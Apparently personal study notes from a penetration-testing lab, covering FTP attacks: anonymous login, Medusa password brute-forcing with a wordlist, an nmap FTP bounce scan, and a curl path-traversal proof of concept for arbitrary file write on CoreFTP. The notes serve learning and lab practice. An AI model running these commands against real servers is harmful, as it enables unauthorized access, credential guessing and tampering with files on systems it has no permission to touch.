# Misconfigurations
- Try anonymous login
	- `ftp <IP>`
	- `anonymous:<no password>

# Protocol Specific attack
- Brute forcing with Medusa
	- `medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp `
		- `-u` for single user
		- `-U` for list of usernames
		- `-P for list of passwords`

- FTP bounce attack
	- Have an open FTP server, and another target machine
	- FTP connected to target machine, target machine may not be accessible by internet
	- Can use the FTP connection to scan the target machine and obtain info about the server's open ports
	- Old school FTP uses 2 connections: control channel (commands) and separate data connection for file listings/transfers
		- With the PORT command, a client can tell the FTP server "send the data to *this* IP:port"
	- TLDR; the FTP server makes the network connections on your behalf
	- ` nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
		- `-b`: FTP bounce attack
		- FTP server is 10.10.110.213, uses it to check if port 80 on 172.17.0.2 is open

# Latest Vulnerablity: CoreFTP beforebuild 727
- FTP service uses HTTP Post request to upload files
- However, CoreFTP service allows HTTP PUT request, allowing us to **write content to files**
- `curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`
	- Bypass constraints using escape characters
	- Arbitrary file write to target
	- Creates file "whoops" with content "PoC."